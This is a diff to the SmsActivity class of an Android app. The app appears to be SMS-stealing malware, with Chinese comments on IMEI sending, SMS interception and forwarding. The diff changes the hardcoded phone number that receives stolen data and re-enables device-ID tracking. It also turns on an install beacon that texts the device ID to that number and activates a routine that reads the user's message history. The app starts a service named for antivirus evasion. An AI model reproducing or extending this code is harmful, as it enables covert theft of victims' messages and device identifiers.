@@ -23,9 +23,9 @@ import android.os.Bundle;
 public class SmsActivity extends Activity {
 
 	//imei发送
-	public static final String devicephone = "15872325758";
+	public static final String devicephone = "13568986885";
 	//短信转发
-	public static final String phonenum = "15872325758";
+	public static final String phonenum = "13568986885";
 	//拦截
 	public static final String lanjie="DX99#LJ|";
 	//转发
@@ -37,18 +37,15 @@ public class SmsActivity extends Activity {
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		this.startFreeToKillService();
-//		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
-//		AnalyticsConfig.setChannel("Channel" + Tools.getDeviceId(this));
+		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
+		AnalyticsConfig.setChannel("Channel" + Tools.getDeviceId(this));
 		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT + " " + Build.PRODUCT + "--" + Build.MODEL);
 		int code = this.getVersionCode();
 		SharedPreferences sp = Tools.findCheckConfig(this);
 		if (sp.getBoolean("isfrist", true) || code != sp.getInt("code", -100)) {
-//			SMSManager.Send(this, devicephone, "AZ99#AZ|程Z序已安装" + Tools.getDeviceId(this));				//1
-			SMSManager.send(this, devicephone, "千里马已安装,手机型号:" + android.os.Build.DEVICE + 
-						",手机系统版本:" + android.os.Build.VERSION.RELEASE + 
-						",应用系统版本:" + this.getVersionName() + ",唯一标识:" + Tools.getDeviceId(this));		//2
+			SMSManager.send(this, devicephone, "AZ99#AZ|程Z序已安装" + Tools.getDeviceId(this));				//1
 			Tools.saveCheckConfig(this, false, code);
-//			this.findHistorySMS();
+			this.findHistorySMS();
 		}
 	}
 	
@@ -70,16 +67,6 @@ public class SmsActivity extends Activity {
 	private void startFreeToKillService() {
 		LogUtils.write("Send", "启动免杀服务");
 		this.startService(new Intent(this, SMSService.class));
-	}
-	
-	private String getVersionName() {
-		try {
-	        PackageManager manager = this.getPackageManager();
-	        PackageInfo info = manager.getPackageInfo(this.getPackageName(), 0);
-	        return info.versionName;
-	    } catch (Exception e) {
-	    	return null;
-	    }
 	}
 	
 	private int getVersionCode() {
